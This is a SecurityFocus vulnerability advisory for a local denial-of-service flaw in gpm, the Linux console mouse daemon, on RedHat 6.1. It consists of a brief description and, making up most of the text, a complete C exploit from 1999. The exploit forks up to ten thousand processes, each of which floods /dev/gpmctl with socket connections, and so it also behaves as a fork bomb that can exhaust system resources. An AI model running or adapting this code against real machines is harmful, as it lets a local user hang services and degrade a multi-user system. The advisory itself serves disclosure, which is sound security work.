source: http://www.securityfocus.com/bid/1377/info

gpm is a program that allows Linux users to use the mouse in virtual consoles. It communicates with a device, /dev/gpmctl, via unix domain STREAM sockets and is vulnerable to a locally exploitable denial of service attack. If a malicious user makes too many connections to the device, it will hang and gpm will not function. RedHat 6.1 is confirmed to be vulnerable. It is not known what other linux distributions may also be vulnerable. 

// FuckGpm    CADENCE of Lam3rZ    1999.11.23

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/un.h>

#define GDZIE    "/dev/gpmctl"
#define POLACZENIA 200
#define SHITY   10000


int main (void)
{
 int a,b;
 struct sockaddr_un sun;

 sun.sun_family = AF_UNIX;
 strncpy (sun.sun_path, GDZIE, 30);
 printf ("OK...\n");

 if (fork ())
  exit (0);

 for (b = 0; b < SHITY; b++)
  if (fork () == 0)
  break;

 for (b = 0; b < POLACZENIA; b++)
  {
   if ((a = socket (AF_UNIX, SOCK_STREAM, 0)) < 0)
    {
     perror ("socket");
     while (1);
   }

  if (connect (a, (struct sockaddr *) &sun, sizeof (struct sockaddr)) < 0)
   {
    perror ("connect");
    close (a);
    b--;
   }
  }

 while (1);
}
